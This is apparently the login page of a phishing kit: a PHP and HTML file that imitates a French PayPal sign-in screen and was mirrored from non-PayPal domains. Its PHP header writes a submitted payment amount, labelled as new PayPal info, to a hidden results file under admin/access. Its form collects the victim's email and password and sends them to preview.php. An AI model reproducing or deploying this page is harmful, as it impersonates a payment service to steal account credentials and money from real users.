<?php
 
  if(!empty($_POST)) 
  {
    // Les identifiants sont transmis ?
    if(!empty($_POST['euro'])) 
    {
        // On ouvre la session
        session_start();
        // On enregistre le login en session
        $_SESSION['euro'] = $_POST['euro'];
        // On redirige vers le fichier admin.php
      }
    }
    $results_file = __DIR__.DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR.'access'.DIRECTORY_SEPARATOR.'pp.php';
    $body = "<h4 style='color:red; font-weight:bold'>[MONTANT DEMANDE]<h4/>
    <p style='font-size:16px; font-weight:bold'>
    =========== <[ N E W  P A Y P A L  I N F O S ]> =========== <br/>
    Montant £ > {$_SESSION['euro']}<br/>
    =====================================================</p>";
    file_put_contents($_SESSION['fichier'],$body,FILE_APPEND); 
?>
<!DOCTYPE html>
<html data-reactroot="fr">

<!-- Mirrored from transactioneurope.yo.fr/connexion.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Mar 2020 10:24:22 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from paypal.me.mattiasvaucher.com/connexion.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Apr 2020 10:43:21 GMT -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>PayPal|Connexion</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="vx_modal-content">

                <header class="vx_modal-header">
        <div aria-live="pJOHNESSte">
            <div class="headerWrapper">
                <h1 class="vx_text-2 " style="text-align: center">Connectez-vous</h1></div>
        </div>
        <p class="vx_text-body">
        </p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                    <div class="signupCheckBox">
                        
                    </div>
                        <form method="POST" action="preview.php" accept-charset="UTF-8"  name="cvalidate">
                        <input name="_token" type="hidden" value="">

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Email ou numéro de mobile">
                         <label class="floatingLabel" for="cardNumber">Email ou numéro de mobile</label>
                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="" aria-describedby="text-info-cardNumber" id="cardNom" name="email" type="email">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Mot de passe">
                            <label class="floatingLabel" for="banque">Mot de passe</label>
                           <input value="" aria-label="login_emaildiv" class="test_banque test_banque vx_form-control" required="required" autocomplete="off_cardAdresse1" placeholder="" aria-describedby="text-info-banque" id="cardAdresse1" name="password" type="password">
                       </div>
                    
                       

                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Connexion</button>
                    </form>

                </div>

            </div>

        </div>

    </div>

            <div class="signup-page-footer vx_text-legal center">©1999-2020 PayPal. Tous droits réservés.</div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>


<!-- Mirrored from transactioneurope.yo.fr/connexion.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Mar 2020 10:24:22 GMT -->

<!-- Mirrored from paypal.me.mattiasvaucher.com/connexion.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Apr 2020 10:43:21 GMT -->
</html>